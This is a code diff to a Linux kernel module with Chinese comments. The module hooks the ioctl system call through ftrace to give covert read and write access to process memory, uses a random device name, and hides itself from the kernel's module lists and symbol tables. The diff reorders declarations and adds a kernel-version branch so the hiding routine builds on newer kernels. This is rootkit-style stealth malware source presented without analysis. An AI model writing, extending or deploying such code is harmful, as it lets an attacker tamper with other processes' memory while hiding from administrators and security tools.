@@ -12,6 +12,7 @@
 #include "comm.h"
 #include "memory.h"
 #include "process.h"
+#include "ftrace_helper.h"
 
 #define OP_CMD_READ 601
 #define OP_CMD_WRITE 602
@@ -21,18 +22,19 @@ static char *hook_name = NULL;
 static struct class *hook_class = NULL;
 static struct device *hook_device = NULL;
 
+// 函数声明
+static asmlinkage long hooked_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg);
+static asmlinkage long (*orig_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);
 
 static struct ftrace_hook hooks[] = {
     HOOK("__x64_sys_ioctl", hooked_ioctl, &orig_ioctl),
 };
 
-static asmlinkage long (*orig_ioctl)(unsigned int fd, unsigned int cmd, unsigned long arg);
-
 static asmlinkage long hooked_ioctl(unsigned int fd, unsigned int cmd, unsigned long arg)
 {
-    static COPY_MEMORY cm;
-    static MODULE_BASE mb;
-    static char name[0x100] = {0};
+    COPY_MEMORY cm;
+    MODULE_BASE mb;
+    char name[0x100] = {0};
 
     if (cmd >= OP_CMD_READ && cmd <= OP_CMD_BASE)
     {
@@ -79,7 +81,14 @@ void hide_module(void)
     kobject_del(&THIS_MODULE->mkobj.kobj);
     THIS_MODULE->sect_attrs = NULL;
     THIS_MODULE->notes_attrs = NULL;
+    
+    // 内核版本兼容性处理
+    #if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 0, 0)
+    THIS_MODULE->num_syms = 0;
+    #else
     THIS_MODULE->num_symtab = 0;
+    #endif
+    
     THIS_MODULE->symtab = NULL;
 }
 
@@ -114,13 +123,11 @@ static int __init my_module_init(void)
 {
     int ret = 0;
     
-    
     hook_name = get_rand_str();
     if (!hook_name) {
         show_qt_result(0);
         return -ENOMEM;
     }
-    
     
     ret = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
     if (ret) {
@@ -128,7 +135,6 @@ static int __init my_module_init(void)
         show_qt_result(0);
         return ret;
     }
-    
     
     hide_module();
     
